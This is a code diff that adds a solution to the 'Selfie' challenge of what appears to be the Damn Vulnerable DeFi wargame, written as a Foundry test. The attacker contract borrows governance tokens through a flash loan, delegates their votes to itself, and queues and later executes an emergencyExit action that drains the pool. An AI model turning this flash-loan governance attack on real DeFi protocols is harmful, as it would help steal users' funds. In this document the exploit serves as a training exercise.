@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -59,10 +60,18 @@ contract SelfieChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * SOLUTION CODED HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfieAttacker selfieAttacker = new SelfieAttacker(
+            address(pool),
+            address(governance),
+            address(token),
+            recovery
+        );
+        selfieAttacker.startAttack();
+        vm.warp(block.timestamp + 2 days);
+        selfieAttacker.executeProposal(); 
     }
 
     /**
@@ -73,4 +82,65 @@ contract SelfieChallenge is Test {
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
+}
+
+
+/**
+ * SOLUTION CONTRACT CODE ALSO ADDED HERE
+ */
+contract SelfieAttacker is IERC3156FlashBorrower {
+
+    address recovery;
+    SelfiePool pool;
+    SimpleGovernance governance;
+    DamnValuableVotes token;
+    uint actionId;
+
+    bytes32 private constant CALLBACK_SUCCESS =
+        keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    constructor(
+        address _pool,
+        address _governance,
+        address _token,
+        address _recovery
+    ) {
+        pool       = SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+        token      = DamnValuableVotes(_token);
+        recovery   = _recovery;
+    }
+
+    function startAttack() external {
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000 ether, "");
+    }
+
+    function onFlashLoan(
+        address _initiator,
+        address /*_token*/,
+        uint256 _amount,
+        uint256 _fee,
+        bytes calldata /*_data*/
+    ) external returns (bytes32) {
+        require(msg.sender == address(pool),  "SelfieAttacker: Only pool can call");
+        require(_initiator == address(this),  "SelfieAttacker: Initiator is not self");
+
+        // Delegate votes to ourself so we can queue an action
+        token.delegate(address(this));
+
+        uint _actionId = governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeWithSignature("emergencyExit(address)", recovery)
+        );
+        actionId = _actionId;
+
+        token.approve(address(pool), _amount + _fee);
+        return CALLBACK_SUCCESS;
+    }
+
+    function executeProposal() external {
+        governance.executeAction(actionId);
+    }
+
 }
